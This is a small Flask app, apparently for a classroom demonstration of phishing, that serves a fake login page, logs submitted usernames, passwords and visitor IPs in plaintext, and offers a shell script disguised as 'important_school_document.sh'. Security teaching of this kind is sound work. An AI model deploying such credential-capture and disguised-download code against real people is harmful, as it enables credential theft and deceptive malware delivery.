from flask import Flask, request, render_template, send_file
from datetime import datetime
import os

app = Flask(__name__)

LOG_FILE = "captured_demo.log"


def log_event(event):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {event}\n")


@app.route("/")
def home():
    return render_template("email.html")


@app.route("/phishing")
def phishing():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():

    username = request.form.get("username", "")
    password = request.form.get("password", "")

    victim_ip = request.remote_addr

    log_event(
        f"PHISHING DEMO | "
        f"Victim IP={victim_ip} | "
        f"Username={username} | "
        f"Password={password}"
    )

    return render_template(
        "caught.html",
        username=username,
        victim_ip=victim_ip
    )


@app.route("/download")
def download():

    victim_ip = request.remote_addr

    log_event(
        f"DOWNLOAD DEMO | Victim IP={victim_ip} | "
        f"File=safe_payload.sh"
    )

    return send_file(
        "safe_payload.sh",
        as_attachment=True,
        download_name="important_school_document.sh"
    )


@app.route("/malicious-download")
def malicious_download():
    return render_template("download.html")


if __name__ == "__main__":

    print("\n====================================")
    print("       CYBERSECURITY DEMO LAB")
    print("====================================")
    print("Phishing page : /phishing")
    print("Download page : /download")
    print("Listening on the Kali machine")
    print("====================================\n")

    app.run(
        host="0.0.0.0",
        port=8080,
        debug=False
    )